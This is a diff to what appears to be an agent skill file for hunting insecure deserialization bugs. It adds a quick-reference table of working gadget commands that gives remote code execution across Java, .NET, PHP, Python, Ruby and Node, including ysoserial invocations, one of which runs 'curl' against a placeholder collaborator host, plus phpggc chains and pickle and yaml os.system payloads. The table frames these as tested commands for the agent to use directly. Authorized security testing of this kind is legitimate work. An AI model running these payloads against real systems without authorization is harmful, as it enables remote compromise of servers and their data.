@@ -9,11 +9,31 @@ description: Insecure deserialization hunting across Java / .NET / PHP / Python 
 
 ## Wiki
 
-qmd_query "insecure deserialization gadget chain Java .NET PHP Python Ruby Node ysoserial" via wiki-search MCP
-
 Hub: [[web-moc]] · Primary page: [[insecure-deserialization]] · Payload arsenal: `wiki/payloads/deserialization.md`
 Anchors: [[ml-model-deserialization]]
 **REFS:** [[insecure-deserialization]], wiki/payloads/deserialization.md
+
+qmd_query "insecure deserialization gadget chain Java .NET PHP Python Ruby Node ysoserial" via wiki-search MCP — ONLY when you have a concrete hint the map above
+doesn't cover (a specific sink/version/CVE, an observed escape); not a blanket first step.
+
+## Gadget quick reference (use this, don't hand-roll)
+
+Every command/payload below is a real, tested invocation - the SAME gadget a hand-rolled exploit
+script would reimplement worse. Look the runtime up here first; full context for each lives in the
+numbered methodology step. Magic-byte fingerprinting is tabled separately under "Attack surface
+signals" below - not repeated here.
+
+| Runtime | Operation | Command |
+|---|---|---|
+| Java | OOB probe FIRST (proves the sink deserializes, zero exec risk) | `java -jar ysoserial.jar URLDNS "http://probe.<collab>" \| base64 -w0` |
+| Java | Gadget RCE, only after the sink is confirmed | `java -jar ysoserial.jar CommonsCollections6 "curl http://<collab>/x" \| base64 -w0` |
+| .NET | BinaryFormatter gadget RCE | `ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "cmd"` |
+| .NET | ViewState RCE (known machineKey) | `ysoserial.net -p ViewState --generator=... --validationkey=...` |
+| PHP | POP-chain gadget generator | `phpggc Framework/RCE1 system id` |
+| Python | `pickle.loads` gadget | `__reduce__` returning `(os.system, ("cmd",))` |
+| Python | unsafe `yaml.load` gadget | `!!python/object/apply:os.system` |
+| Ruby | unsafe `Marshal.load` / `YAML.load` gadget | universal gadget chain, e.g. `Gem::...` |
+| Node | `node-serialize` gadget | `_$$ND_FUNC$$_` IIFE payload |
 
 ## Confirmation gate
 
